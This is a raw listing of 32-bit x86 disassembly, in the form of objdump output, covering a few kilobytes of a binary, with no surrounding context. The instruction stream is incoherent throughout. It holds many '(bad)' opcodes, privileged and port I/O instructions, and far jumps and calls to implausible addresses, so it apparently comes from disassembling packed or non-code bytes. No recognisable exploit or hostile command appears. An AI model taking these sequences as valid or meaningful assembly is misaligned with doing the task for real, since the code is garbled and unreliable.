  40dd8f:	xchg   esi,eax
  40dd90:	xchg   esi,eax
  40dd91:	aad    0x4b
  40dd93:	jne    0x40dd1d
  40dd95:	mov    esi,0xef9e9e52
  40dd9a:	sbb    ebx,esp
  40dd9c:	jno    0x40de1b
  40dd9e:	fnstsw WORD PTR [edx]
  40dda0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dda1:	pop    esi
  40dda2:	fcom   DWORD PTR [ebp+0x6a2c20ce]
  40dda8:	xchg   ecx,eax
  40dda9:	dec    ecx
  40ddaa:	jle    0x40dddd
  40ddac:	sbb    BYTE PTR [ebx],0x2b
  40ddaf:	scas   eax,DWORD PTR es:[edi]
  40ddb0:	adc    ecx,esi
  40ddb2:	and    bl,0xe3
  40ddb5:	rcl    ch,1
  40ddb7:	mov    esi,0x71c14bd4
  40ddbc:	fcomp  DWORD PTR gs:[esi]
  40ddbf:	jne    0x40de34
  40ddc1:	push   esp
  40ddc2:	fnstsw WORD PTR [edi+0x46]
  40ddc5:	data16 fwait
  40ddc7:	xchg   edi,eax
  40ddc8:	jno    0x40dde3
  40ddca:	and    DWORD PTR [edx+esi*4+0x35],edi
  40ddce:	add    bl,BYTE PTR [ebx]
  40ddd0:	jecxz  0x40ddf1
  40ddd2:	add    DWORD PTR [ebx-0x21],ecx
  40ddd5:	lods   al,BYTE PTR ds:[esi]
  40ddd6:	shl    DWORD PTR [ebx+0x36f1dc69],1
  40dddc:	mov    esi,0xf7ac1cdd
  40dde1:	inc    edi
  40dde2:	in     eax,0x64
  40dde4:	psubb  mm1,QWORD PTR ds:0x5a5e2757
  40ddeb:	(bad)  
  40dded:	push   ebp
  40ddee:	int3   
  40ddef:	push   esp
  40ddf0:	mov    edx,0x7f1bee39
  40ddf5:	imul   ebp,ebp,0x56dff469
  40ddfb:	rcr    esi,0xfd
  40ddfe:	addr16 jne 0x40dda3
  40de01:	out    0x35,al
  40de03:	inc    ecx
  40de04:	sbb    cl,dl
  40de06:	or     al,0xa3
  40de08:	je     0x40ddf4
  40de0a:	jge    0x40ddef
  40de0c:	mul    BYTE PTR [edx]
  40de0e:	int3   
  40de0f:	push   ebp
  40de10:	push   esi
  40de11:	call   0x97115386
  40de16:	push   ecx
  40de17:	push   0x55f3d146
  40de1c:	addr16 mov eax,ds:0x3ad5
  40de20:	xchg   DWORD PTR [eax],ebx
  40de22:	xchg   esi,eax
  40de23:	and    eax,0xe96d9f7c
  40de28:	add    BYTE PTR [edi],ch
  40de2a:	inc    edi
  40de2b:	jmp    0x40de4f
  40de2d:	ficom  DWORD PTR ds:0xface81c1
  40de33:	cmp    eax,0x6938c74
  40de38:	pop    es
  40de39:	out    0xe6,eax
  40de3b:	sub    al,0xd6
  40de3d:	and    bl,ah
  40de3f:	mov    edi,0xeb96fff1
  40de44:	je     0x40ddd9
  40de46:	push   ds
  40de47:	jo     0x40de90
  40de49:	cmp    ebx,esp
  40de4b:	inc    esp
  40de4c:	inc    eax
  40de4d:	push   esi
  40de4e:	sbb    eax,0x1b2dcca1
  40de53:	jne    0x40de89
  40de55:	mov    esi,0xfb4e947f
  40de5a:	aad    0x6
  40de5c:	lods   eax,DWORD PTR gs:[esi]
  40de5e:	push   0x4b
  40de60:	call   esi
  40de62:	mov    esi,0x66115075
  40de67:	sbb    edx,DWORD PTR [esi+eiz*4-0x58cc5e4]
  40de6e:	icebp  
  40de6f:	fst    st(4)
  40de71:	das    
  40de72:	jae    0x40de69
  40de74:	cs shr ecx,0x29
  40de78:	int3   
  40de79:	and    bl,BYTE PTR ds:0xdd48491d
  40de7f:	loop   0x40de9b
  40de81:	cmp    ah,BYTE PTR [edx]
  40de83:	pop    ebp
  40de84:	push   es
  40de85:	fsub   DWORD PTR ss:0x2ed466fe
  40de8c:	pop    ds
  40de8d:	fsub   DWORD PTR [eax]
  40de8f:	xchg   esi,eax
  40de90:	xchg   edi,eax
  40de91:	pop    ds
  40de92:	mov    ds:0x35973dd4,al
  40de97:	fst    DWORD PTR [ebp-0x36]
  40de9a:	aad    0x12
  40de9c:	xor    dh,BYTE PTR [eax]
  40de9e:	repz iret 
  40dea0:	sbb    DWORD PTR [ecx-0x29458ae4],ebx
  40dea6:	fistp  QWORD PTR [ecx]
  40dea8:	mov    DWORD PTR [ebx+0x25],edi
  40deab:	scas   eax,DWORD PTR es:[edi]
  40deac:	sub    DWORD PTR [esp+ecx*2],eax
  40deaf:	shl    DWORD PTR [ecx-0x4e],cl
  40deb2:	pop    eax
  40deb3:	aad    0x8f
  40deb5:	(bad)  [edi-0x79]
  40deb8:	push   ebp
  40deb9:	and    ebx,ecx
  40debb:	retf   
  40debc:	inc    ecx
  40debd:	paddb  mm6,QWORD PTR [ebx-0x76]
  40dec1:	xchg   edi,eax
  40dec2:	pop    esi
  40dec3:	jne    0x40de6e
  40dec5:	and    DWORD PTR [edi+0x14],ecx
  40dec8:	mov    WORD PTR ds:0xcdbd995b,fs
  40dece:	mov    eax,ds:0x10b6e075
  40ded3:	mov    WORD PTR [edx-0x194a2a4f],fs
  40ded9:	push   edx
  40deda:	push   esp
  40dedb:	adc    DWORD PTR [ecx+0x9],esp
  40dede:	int    0x75
  40dee0:	mov    dh,0x15
  40dee2:	call   0x237c7cf8
  40dee7:	outs   dx,BYTE PTR ds:[esi]
  40dee8:	jmp    0xd59b:0xe3d4ebbd
  40deef:	mov    ebx,0xb720b3c9
  40def4:	adc    ah,BYTE PTR [eax]
  40def6:	pop    es
  40def7:	(bad)  
  40def8:	cdq    
  40def9:	cmp    edi,DWORD PTR [eax]
  40defb:	push   0xae0e7495
  40df00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df01:	mov    ebp,0x6af1956d
  40df06:	xor    eax,0x70ec2973
  40df0b:	js     0x40ded5
  40df0d:	loope  0x40df84
  40df0f:	ins    BYTE PTR es:[edi],dx
  40df10:	mov    ebx,0xb7a7a572
  40df15:	cdq    
  40df16:	fsubr  QWORD PTR [esi-0x6e9b24ac]
  40df1c:	jno    0x40df1e
  40df1e:	leave  
  40df1f:	xchg   esp,eax
  40df20:	bnd ja 0x40df75
  40df23:	xor    al,0x7f
  40df25:	dec    esp
  40df26:	adc    eax,0xfb83d1f8
  40df2b:	arpl   WORD PTR [esi-0x3e32a88],di
  40df31:	gs push 0xffffffc6
  40df34:	xor    eax,0xd075e5c5
  40df39:	push   esi
  40df3a:	adc    al,0xfe
  40df3c:	mov    eax,ds:0x86a53fd8
  40df41:	scas   eax,DWORD PTR es:[edi]
  40df42:	aad    0x63
  40df44:	in     eax,0x88
  40df46:	sbb    cl,BYTE PTR [ebx-0x56]
  40df49:	repz pop esp
  40df4b:	jne    0x40df88
  40df4d:	jmp    FWORD PTR [ecx+0xf]
  40df50:	pop    edi
  40df51:	clc    
  40df52:	fstp   TBYTE PTR [eax-0x1de4c68f]
  40df58:	sub    BYTE PTR [esi+0x1ff35dea],dl
  40df5e:	xor    BYTE PTR [edi-0x2aee17d7],ah
  40df64:	std    
  40df65:	cmp    edx,ebp
  40df67:	clc    
  40df68:	cdq    
  40df69:	int3   
  40df6a:	and    eax,0x5f752d62
  40df6f:	jle    0x40df56
  40df71:	out    0xd7,al
  40df73:	cli    
  40df74:	jno    0x40df41
  40df76:	inc    ecx
  40df77:	push   eax
  40df78:	aaa    
  40df79:	inc    ebp
  40df7a:	fadd   QWORD PTR [ecx+0x67]
  40df7d:	int    0x4c
  40df7f:	pop    ds
  40df80:	add    DWORD PTR [edx+0x3f46ce80],esi
  40df86:	fistp  QWORD PTR [edi]
  40df88:	jmp    0x40dfe9
  40df8a:	or     ebx,ebx
  40df8c:	mov    es,WORD PTR [edi]
  40df8e:	aas    
  40df8f:	fnsave [eax-0x7c0b1489]
  40df95:	inc    esi
  40df96:	ins    DWORD PTR es:[edi],dx
  40df97:	lds    edx,FWORD PTR [edi+0x76755908]
  40df9d:	(bad)  
  40df9e:	push   ss
  40df9f:	inc    ecx
  40dfa0:	les    ebx,FWORD PTR [ebx-0x788e5291]
  40dfa6:	lea    ebx,[esi]
  40dfa8:	sub    dl,0xcd
  40dfab:	add    BYTE PTR [ecx],0x20
  40dfae:	pop    esi
  40dfaf:	xlat   BYTE PTR ds:[ebx]
  40dfb0:	push   edi
  40dfb1:	aad    0x9c
  40dfb3:	dec    eax
  40dfb4:	scas   eax,DWORD PTR es:[edi]
  40dfb5:	fs aad 0xe0
  40dfb8:	sbb    al,0x7d
  40dfba:	dec    esp
  40dfbb:	sub    DWORD PTR [esi],edx
  40dfbd:	inc    edi
  40dfbe:	(bad)  
  40dfbf:	outs   dx,DWORD PTR ds:[esi]
  40dfc0:	adc    BYTE PTR [eax],ah
  40dfc2:	xchg   edi,eax
  40dfc3:	(bad)  
  40dfc4:	sub    eax,0x6e6de377
  40dfc9:	ss aad 0x3d
  40dfcc:	mov    dl,0x9a
  40dfce:	gs xchg esp,eax
  40dfd0:	mov    ds:0xd882d87b,al
  40dfd5:	jmp    0x5f41a222
  40dfda:	xchg   ebp,eax
  40dfdb:	sbb    eax,0x9795f997
  40dfe0:	jb     0x40df85
  40dfe2:	in     al,dx
  40dfe3:	push   0xffffff9f
  40dfe5:	add    BYTE PTR [ebx+ebp*1],cl
  40dfe8:	cmp    DWORD PTR [esp+ecx*8+0xadec478],esi
  40dfef:	ds jnp 0x40dfa3
  40dff2:	int    0x11
  40dff4:	in     al,dx
  40dff5:	mov    ds:0x92e56dd5,eax
  40dffa:	xor    BYTE PTR [ecx],cl
  40dffc:	sbb    al,0x76
  40dffe:	mov    ecx,0x3c5fd775
  40e003:	sahf   
  40e004:	aas    
  40e005:	mov    WORD PTR [edx-0x2316124c],?
  40e00b:	xor    DWORD PTR [edx+0x51],edx
  40e00e:	out    0xe9,eax
  40e010:	loope  0x40dff2
  40e012:	(bad)  
  40e013:	adc    esp,DWORD PTR fs:[eax]
  40e016:	xlat   BYTE PTR ds:[ebx]
  40e017:	jo     0x40e052
  40e019:	sbb    dh,0x82
  40e01c:	fdivr  DWORD PTR [ebp+edx*8-0x741dc182]
  40e023:	cmp    eax,esi
  40e025:	xchg   esp,eax
  40e026:	into   
  40e027:	mov    al,al
  40e029:	les    esi,FWORD PTR [edi]
  40e02b:	xchg   esp,eax
  40e02c:	into   
  40e02d:	ffreep st(1)
  40e02f:	mov    ch,0xdf
  40e031:	mov    ds:0xde715119,al
  40e036:	test   al,0xc6
  40e038:	cs not esi
  40e03b:	add    eax,0xec4c9433
  40e040:	dec    ecx
  40e041:	inc    esp
  40e042:	mov    dh,0x83
  40e044:	js     0x40e074
  40e046:	jno    0x40e058
  40e048:	jno    0x40e0c2
  40e04a:	pop    ss
  40e04b:	pop    esp
  40e04c:	dec    ebp
  40e04d:	push   cs
  40e04e:	(bad)  
  40e04f:	jle    0x40dffe
  40e051:	xchg   esi,eax
  40e052:	push   0x4e25afe
  40e057:	xchg   ecx,eax
  40e058:	popf   
  40e059:	dec    eax
  40e05a:	sub    DWORD PTR [ebx-0x4c],eax
  40e05d:	pop    ebp
  40e05e:	jne    0x40e08b
  40e060:	ss jo  0x40e015
  40e063:	je     0x40e0d6
  40e065:	out    dx,al
  40e066:	mov    eax,0x825c48a9
  40e06b:	leave  
  40e06c:	pop    ebx
  40e06d:	pop    ebp
  40e06e:	sti    
  40e06f:	(bad)  
  40e070:	repnz lods eax,DWORD PTR ds:[esi]
  40e072:	sahf   
  40e073:	adc    eax,0x968c7ede
  40e078:	mov    esp,0x7625e8ef
  40e07d:	add    al,0x7d
  40e07f:	out    0xc4,al
  40e081:	popa   
  40e082:	pop    eax
  40e083:	xchg   ebp,eax
  40e084:	inc    ebp
  40e085:	lock sbb al,0xe5
  40e088:	add    BYTE PTR [eax],ah
  40e08a:	or     bh,BYTE PTR [edi-0x64013bfa]
  40e090:	fs retf 
  40e092:	aad    0x2
  40e094:	adc    BYTE PTR [ebx-0x13],ch
  40e097:	adc    cl,dh
  40e099:	je     0x40e033
  40e09b:	jne    0x40e0b8
  40e09d:	stc    
  40e09e:	mov    esi,0x79e66672
  40e0a3:	out    0xaa,eax
  40e0a5:	pushf  
  40e0a6:	or     eax,0xc028e775
  40e0ab:	dec    ecx
  40e0ac:	into   
  40e0ad:	xor    eax,0x905f7530
  40e0b2:	sbb    eax,eax
  40e0b4:	sbb    ebx,DWORD PTR [edx]
  40e0b6:	jb     0x40e09b
  40e0b8:	jb     0x40e0a0
  40e0ba:	sub    esi,eax
  40e0bc:	fnstenv [ebx+0x51]
  40e0bf:	inc    ebp
  40e0c0:	popa   
  40e0c1:	(bad)  
  40e0c2:	dec    edx
  40e0c3:	jne    0x40e090
  40e0c5:	ja     0x40e04e
  40e0c7:	sbb    al,0xe8
  40e0c9:	xor    eax,esi
  40e0cb:	int    0x90
  40e0cd:	and    DWORD PTR [edi],edi
  40e0cf:	(bad)  
  40e0d0:	jb     0x40e0c2
  40e0d2:	add    cl,dl
  40e0d4:	xchg   BYTE PTR [ebx+0x2dae4915],dl
  40e0da:	adc    DWORD PTR [ebp+0x24],esi
  40e0dd:	dec    eax
  40e0de:	dec    ebx
  40e0df:	call   0x88df5f35
  40e0e4:	jno    0x40e0ca
  40e0e6:	inc    ecx
  40e0e7:	cld    
  40e0e8:	push   esi
  40e0e9:	cdq    
  40e0ea:	sbb    BYTE PTR [edx],0xc5
  40e0ed:	pop    ds
  40e0ee:	or     DWORD PTR [edx],eax
  40e0f0:	cmc    
  40e0f1:	fnstsw WORD PTR cs:[esi]
  40e0f4:	les    esp,FWORD PTR [ebp+edx*8-0x4e]
  40e0f8:	inc    ebp
  40e0f9:	mov    ah,0x4d
  40e0fb:	fistp  WORD PTR [eax-0x32]
  40e0fe:	std    
  40e0ff:	scas   eax,DWORD PTR es:[edi]
  40e100:	pop    esi
  40e101:	(bad)  
  40e103:	pop    ss
  40e104:	fcom   st(6)
  40e106:	push   ss
  40e107:	std    
  40e108:	xchg   BYTE PTR [eax+0x6d],dl
  40e10b:	icebp  
  40e10c:	lods   eax,DWORD PTR ds:[esi]
  40e10d:	sbb    al,0x74
  40e110:	in     eax,0x31
  40e112:	push   0x46954367
  40e117:	jmp    0x30b4:0x325f1dd8
  40e11e:	lods   eax,DWORD PTR ds:[esi]
  40e11f:	mov    ecx,0x7e14e241
  40e124:	loope  0x40e0cc
  40e126:	fsub   st,st(5)
  40e128:	lahf   
  40e129:	inc    ecx
  40e12a:	gs mov ebx,0x75bb8b8a
  40e130:	mov    BYTE PTR [ebx+edx*8+0x50],bl
  40e134:	pop    ebx
  40e135:	and    al,0x7f
  40e137:	xchg   BYTE PTR [ecx-0x55],dh
  40e13a:	das    
  40e13b:	repnz shr ecx,1
  40e13e:	loop   0x40e186
  40e140:	xchg   ecx,eax
  40e141:	and    BYTE PTR [esi],dl
  40e143:	mov    edx,0xaa931e07
  40e148:	test   al,0xb
  40e14a:	sub    al,0xa7
  40e14c:	loope  0x40e194
  40e14e:	dec    edx
  40e14f:	mov    DWORD PTR [eax+0x714b6198],edx
  40e155:	lock cmp DWORD PTR [edi],esi
  40e158:	pop    esp
  40e159:	sbb    ah,BYTE PTR [esi+0x78]
  40e15c:	push   0x942d8670
  40e161:	adc    BYTE PTR [esi+0x62],dh
  40e164:	fisubr DWORD PTR [ecx*4+0x13646bd3]
  40e16b:	mov    esp,0x4dc526d4
  40e170:	sbb    al,0xbf
  40e172:	lds    edi,FWORD PTR [esi+0x4f]
  40e175:	(bad)  
  40e176:	call   0xc845f2ef
  40e17b:	adc    bh,BYTE PTR [edi+0x6b064ba8]
  40e181:	cmp    bl,ah
  40e183:	cld    
  40e184:	mov    ?,eax
  40e186:	arpl   WORD PTR ds:0x38d04b67,si
  40e18c:	repz pop ds
  40e18e:	scas   eax,DWORD PTR es:[edi]
  40e18f:	mov    ds,WORD PTR [edi+0x8]
  40e192:	sti    
  40e193:	push   ecx
  40e194:	scas   eax,DWORD PTR es:[edi]
  40e195:	push   eax
  40e196:	aad    0x77
  40e198:	jg     0x40e1e8
  40e19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e19b:	xchg   edi,eax
  40e19c:	mov    eax,0x7eb315eb
  40e1a1:	xchg   esp,eax
  40e1a2:	push   ebp
  40e1a3:	dec    ebp
  40e1a4:	jbe    0x40e1b0
  40e1a6:	inc    eax
  40e1a7:	or     ah,dl
  40e1a9:	jg     0x40e180
  40e1ab:	xor    edx,DWORD PTR [ebp-0x516d12b9]
  40e1b1:	ss call 0x38dc:0xe4118684
  40e1b9:	cmp    edi,DWORD PTR [eax-0x6d75061b]
  40e1bf:	inc    edx
  40e1c0:	jno    0x40e156
  40e1c2:	outs   dx,DWORD PTR ds:[esi]
  40e1c3:	int    0xee
  40e1c5:	xor    eax,0x1f96837f
  40e1ca:	mov    DWORD PTR [ebp-0x54ef0835],0x52d59755
  40e1d4:	mov    eax,ds:0x9a429cf6
  40e1d9:	sti    
  40e1da:	cmp    eax,0xdccf70b0
  40e1df:	mov    dh,0xd6
  40e1e1:	push   ebp
  40e1e2:	jg     0x40e1e9
  40e1e4:	adc    BYTE PTR [esi-0x5055c9ac],bh
  40e1ea:	xchg   edi,eax
  40e1eb:	call   0x5085fb70
  40e1f0:	test   BYTE PTR [edi-0x7f],bh
  40e1f3:	xchg   al,ch
  40e1f5:	adc    DWORD PTR [eax],ecx
  40e1f7:	jne    0x40e1b2
  40e1f9:	daa    
  40e1fa:	xor    eax,0x1ec7aaa4
  40e1ff:	test   al,0x71
  40e201:	or     BYTE PTR [eiz*8-0x2e6e55df],al
  40e208:	mov    edi,0x8cfc4d1f
  40e20d:	sbb    esp,DWORD PTR [ebx]
  40e20f:	daa    
  40e210:	sub    BYTE PTR [edx-0x29],bl
  40e213:	lods   eax,DWORD PTR ds:[esi]
  40e214:	mov    BYTE PTR [edx+0x47],ch
  40e217:	pop    ebx
  40e218:	cli    
  40e219:	pop    edi
  40e21a:	stos   DWORD PTR es:[edi],eax
  40e21b:	js     0x40e1de
  40e21d:	pop    esi
  40e21e:	pop    ecx
  40e21f:	xor    DWORD PTR [ecx-0x45],0x8fad3734
  40e226:	jbe    0x40e26f
  40e228:	jno    0x40e1ff
  40e22a:	aaa    
  40e22b:	ret    0x184e
  40e22e:	adc    DWORD PTR [edi],eax
  40e230:	icebp  
  40e231:	and    ah,cl
  40e233:	mov    bl,0x7
  40e235:	(bad)  
  40e236:	mov    al,ds:0xa87d6176
  40e23b:	dec    ebx
  40e23c:	pop    ebp
  40e23d:	sti    
  40e23e:	iret   
  40e23f:	inc    esp
  40e240:	je     0x40e232
  40e242:	clc    
  40e243:	dec    ebp
  40e244:	mov    ch,0xd1
  40e246:	pop    esi
  40e247:	and    eax,0x63cd4952
  40e24c:	mov    esp,0x63a8c420
  40e251:	mov    ds:0x5f2df29b,al
  40e256:	jecxz  0x40e239
  40e258:	push   es
  40e259:	and    BYTE PTR [edx-0x4],bh
  40e25c:	outs   dx,BYTE PTR ds:[esi]
  40e25d:	mov    ecx,0x44b3751e
  40e262:	lods   eax,DWORD PTR ds:[esi]
  40e263:	shr    BYTE PTR [esi],0xa4
  40e266:	add    ebx,DWORD PTR [ecx+esi*2]
  40e269:	ret    0x4e62
  40e26c:	leave  
  40e26d:	js     0x40e24d
  40e26f:	sub    esp,DWORD PTR [ebp+0x20]
  40e272:	sbb    DWORD PTR [ecx+0x48],ebx
  40e275:	ins    BYTE PTR es:[edi],dx
  40e276:	mov    dh,0x6a
  40e278:	xchg   ebp,eax
  40e279:	in     eax,dx
  40e27a:	aad    0x8d
  40e27c:	xchg   edi,eax
  40e27d:	jp     0x40e25e
  40e27f:	js     0x40e220
  40e281:	sbb    DWORD PTR [edi+0x78],0x491bb69a
  40e288:	sbb    al,0x42
  40e28a:	ins    DWORD PTR es:[edi],dx
  40e28b:	and    dl,BYTE PTR [ebx]
  40e28d:	add    ebx,ebx
  40e28f:	jge    0x40e2c2
  40e291:	test   DWORD PTR [esi],edi
  40e293:	push   esi
  40e294:	jno    0x40e253
  40e296:	jbe    0x40e2c5
  40e298:	dec    edi
  40e299:	out    0xf5,eax
  40e29b:	je     0x40e307
  40e29d:	pop    ebx
  40e29e:	loop   0x40e22c
  40e2a0:	fisttp QWORD PTR [esi]
  40e2a2:	pcmpeqb mm6,QWORD PTR [ecx+0x24]
  40e2a6:	sub    ebx,DWORD PTR ds:0x51a9a788
  40e2ac:	mov    cl,BYTE PTR [edi]
  40e2ae:	mov    al,0x75
  40e2b0:	jne    0x40e313
  40e2b2:	cmp    DWORD PTR [ebp+0x365a9ce7],0xfcfab17c
  40e2bc:	sbb    al,0x20
  40e2be:	adc    al,BYTE PTR [edx]
  40e2c0:	ror    DWORD PTR [edi-0x4],1
  40e2c3:	mov    bl,0x30
  40e2c5:	or     DWORD PTR [esi-0x22],edx
  40e2c8:	adc    al,0x10
  40e2ca:	cmp    DWORD PTR [ecx+0x73f229cd],esi
  40e2d0:	add    eax,0x6db595f8
  40e2d5:	xchg   edx,eax
  40e2d6:	or     al,0x59
  40e2d8:	dec    edi
  40e2d9:	and    BYTE PTR [eax-0x734749b9],al
  40e2df:	xor    DWORD PTR [edi+edx*8+0x3702e5d5],ebx
  40e2e6:	(bad)  
  40e2e8:	stos   DWORD PTR es:[edi],eax
  40e2e9:	or     BYTE PTR [ebx-0x32c5ea8b],al
  40e2ef:	js     0x40e2cf
  40e2f1:	inc    edx
  40e2f2:	repnz inc esp
  40e2f4:	jno    0x40e2f2
  40e2f6:	push   edx
  40e2f7:	outs   dx,BYTE PTR ds:[esi]
  40e2f8:	frstor ds:0x1ff0e318
  40e2fe:	add    BYTE PTR [edi-0xb],dh
  40e301:	pop    es
  40e302:	sbb    cl,cl
  40e304:	fnop   
  40e306:	aad    0xb
  40e308:	and    al,0xb5
  40e30a:	dec    ecx
  40e30b:	pushf  
  40e30c:	cmp    ah,BYTE PTR ds:0xca627cd3
  40e312:	scas   eax,DWORD PTR es:[edi]
  40e313:	cli    
  40e314:	adc    BYTE PTR [eax],ah
  40e316:	mov    ch,0x9
  40e318:	ficomp WORD PTR [ebp+edx*8+0x30]
  40e31c:	sub    BYTE PTR [esi-0x31],cl
  40e31f:	les    ecx,FWORD PTR [ebp+0x4c]
  40e322:	mov    bl,0x7c
  40e324:	movntps XMMWORD PTR [eax],xmm4
  40e327:	push   bp
  40e329:	mov    esi,0x96092315
  40e32e:	call   0x6ad35511
  40e333:	pop    ss
  40e334:	add    bl,BYTE PTR [edx]
  40e336:	add    BYTE PTR [edx-0xecadfcf],bh
  40e33c:	(bad)  
  40e33e:	stos   DWORD PTR es:[edi],eax
  40e33f:	dec    ebp
  40e340:	rol    edi,cl
  40e342:	aad    0xde
  40e344:	lods   eax,DWORD PTR ds:[esi]
  40e345:	aam    0x67
  40e347:	pop    esp
  40e348:	mov    bh,0xdc
  40e34a:	mov    eax,0x24396175
  40e34f:	arpl   ax,dx
  40e351:	stos   BYTE PTR es:[edi],al
  40e352:	in     al,dx
  40e353:	aad    0x7d
  40e355:	push   cs
  40e356:	mov    BYTE PTR [edi],cl
  40e358:	out    dx,eax
  40e359:	mov    edx,eax
  40e35b:	jbe    0x40e2e0
  40e35d:	pop    es
  40e35e:	addr16 jle 0x40e330
  40e361:	cmp    ebp,ebx
  40e363:	inc    eax
  40e364:	mov    bl,0x18
  40e366:	(bad)  
  40e367:	sub    BYTE PTR [edx-0x64fed2c3],ah
  40e36d:	retf   
  40e36e:	je     0x40e3e9
  40e370:	or     BYTE PTR [ecx-0x6033c45d],al
  40e376:	jbe    0x40e358
  40e378:	dec    esp
  40e379:	not    dh
  40e37b:	cmp    dh,0xb7
  40e37e:	push   cs
  40e37f:	add    DWORD PTR [ebp-0x3a033695],esp
  40e385:	pop    ds
  40e386:	pop    ebx
  40e387:	jle    0x40e32f
  40e389:	jnp    0x40e386
  40e38b:	jp     0x40e367
  40e38d:	dec    esi
  40e38e:	aad    0xc3
  40e390:	dec    ebx
  40e391:	xchg   BYTE PTR [esi+eiz*4-0x51],cl
  40e395:	leave  
  40e396:	icebp  
  40e397:	je     0x40e3ce
  40e399:	data16 jnp 0x40e3df
  40e39c:	sbb    BYTE PTR [esi+0x2b7185cd],dl
  40e3a2:	fidiv  WORD PTR [edi+0x27]
  40e3a5:	loop   0x40e3d8
  40e3a7:	cdq    
  40e3a8:	int3   
  40e3a9:	pop    ds
  40e3aa:	sti    
  40e3ab:	pop    ds
  40e3ac:	fwait
  40e3ad:	xlat   BYTE PTR ds:[ebx]
  40e3ae:	addr16 mov ch,0x68
  40e3b1:	mov    ebp,ss
  40e3b3:	cmp    DWORD PTR [ecx-0x38],ebp
  40e3b6:	or     al,0xf3
  40e3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3b9:	and    esi,eax
  40e3bb:	xor    DWORD PTR [eax+eax*4],0xffffffca
  40e3bf:	mov    dh,BYTE PTR [ecx+0xa]
  40e3c2:	mov    edx,0xd5cb54ad
  40e3c7:	mov    dl,0x50
  40e3c9:	dec    esp
  40e3ca:	call   0x1f2253a0
  40e3cf:	mov    ds:0x7c46902f,eax
  40e3d4:	cmp    DWORD PTR [edx+ebp*2-0x59],esp
  40e3d8:	jbe    0x40e438
  40e3da:	mov    ch,0xd
  40e3dc:	pop    esi
  40e3dd:	inc    esi
  40e3de:	fiadd  WORD PTR [edx+0x75b95e1e]
  40e3e4:	(bad)  
  40e3e5:	push   ebx
  40e3e6:	addr16 in eax,dx
  40e3e8:	out    dx,al
  40e3e9:	and    ecx,esi
  40e3eb:	xchg   edx,eax
  40e3ec:	arpl   sp,sp
  40e3ee:	or     eax,0x4193d1d8
  40e3f3:	shl    DWORD PTR [ecx+0x24],1
  40e3f6:	push   ss
  40e3f7:	ins    BYTE PTR es:[edi],dx
  40e3f8:	sbb    cl,BYTE PTR [ebx]
  40e3fa:	lds    esi,FWORD PTR [edx]
  40e3fc:	iret   
  40e3fd:	pop    eax
  40e3fe:	or     al,0xae
  40e400:	jno    0x40e438
  40e402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e403:	push   ebp
  40e404:	pop    ds
  40e405:	jmp    0xf623eb54
  40e40a:	icebp  
  40e40b:	outs   dx,BYTE PTR ds:[esi]
  40e40c:	ret    
  40e40d:	cld    
  40e40e:	xchg   esi,eax
  40e40f:	add    esp,DWORD PTR [eax-0x50]
  40e412:	out    dx,al
  40e413:	scas   al,BYTE PTR es:[edi]
  40e414:	ror    DWORD PTR [eax],1
  40e416:	call   0x8135:0x5d000b94
  40e41d:	sub    ebp,0x7d
  40e420:	gs push cs
  40e422:	(bad)  
  40e423:	add    al,0x51
  40e426:	repnz adc DWORD PTR [bx+0x4d],edi
  40e42b:	jne    0x40e3d7
  40e42d:	nop
  40e42e:	sbb    BYTE PTR [esi+eiz*8+0x71304fcf],bl
  40e435:	popf   
  40e436:	cmc    
  40e437:	popf   
  40e438:	js     0x40e48f
  40e43a:	mov    cl,BYTE PTR [ebx]
  40e43c:	sbb    DWORD PTR [edi],esp
  40e43e:	fwait
  40e43f:	out    0x94,eax
  40e441:	xor    ah,BYTE PTR ds:0xbd62e068
  40e447:	and    al,0x39
  40e449:	inc    eax
  40e44a:	inc    ebp
  40e44b:	inc    ebx
  40e44c:	jg     0x40e494
  40e44e:	pop    edx
  40e44f:	adc    DWORD PTR [bx+si+0x20],eax
  40e453:	test   eax,0x74ffc4ea
  40e458:	repnz dec esi
  40e45a:	in     eax,dx
  40e45b:	cli    
  40e45c:	pop    edi
  40e45d:	stc    
  40e45e:	pop    edi
  40e45f:	sub    al,0x71
  40e461:	hlt    
  40e462:	sub    DWORD PTR [ebx+eiz*2+0x49],esi
  40e466:	xor    esi,DWORD PTR [esi+0x44]
  40e469:	and    al,dh
  40e46b:	and    eax,0x3dcb53fc
  40e470:	jnp    0x40e4ec
  40e472:	fidiv  DWORD PTR [ebx-0x4337d405]
  40e478:	icebp  
  40e479:	mov    eax,ds:0x201048ab
  40e47e:	jl     0x40e432
  40e480:	sub    al,0xbd
  40e482:	push   eax
  40e483:	lea    esi,[ebp+0x3cc7d54f]
  40e489:	ret    0x8ae8
  40e48c:	(bad)  
  40e48d:	fxch   st(3)
  40e48f:	hlt    
  40e490:	mov    ebx,0x2068c51f
  40e495:	pop    ebp
  40e496:	cmp    DWORD PTR ds:0xcae02635,0xf
  40e49d:	cmp    BYTE PTR [ebp+0x75],bh
  40e4a0:	fs xchg edx,eax
  40e4a2:	jo     0x40e4e7
  40e4a4:	or     bl,BYTE PTR [edi-0x21]
  40e4a7:	aam    0x71
  40e4a9:	jns    0x40e4c0
  40e4ab:	cld    
  40e4ac:	mov    esi,0x71181faf
  40e4b1:	fs int 0xc6
  40e4b4:	add    al,0x49
  40e4b6:	jns    0x40e4ef
  40e4b8:	add    ah,BYTE PTR [eax]
  40e4ba:	addr16 mov esp,0x50b3782a
  40e4c0:	rcl    DWORD PTR [eax+0x3c25bad5],0x92
  40e4c7:	mov    al,BYTE PTR [esi+edx*4]
  40e4ca:	popf   
  40e4cb:	jl     0x40e52e
  40e4cd:	cld    
  40e4ce:	repz sbb eax,esp
  40e4d1:	fst    QWORD PTR [edx+0x75]
  40e4d4:	ror    DWORD PTR [eax+edx*1-0x2a800aa1],cl
  40e4db:	loop   0x40e4b8
  40e4dd:	and    DWORD PTR [esi-0xa],ecx
  40e4e0:	fadd   QWORD PTR [eax]
  40e4e2:	cmp    al,0x75
  40e4e4:	(bad)  
  40e4e5:	shl    BYTE PTR [edx-0x34],1
  40e4e8:	aad    0x5f
  40e4ea:	pop    ecx
  40e4eb:	in     al,0x71
  40e4ed:	sub    ebx,edx
  40e4ef:	lock stos DWORD PTR es:[edi],eax
  40e4f1:	retf   0xc40a
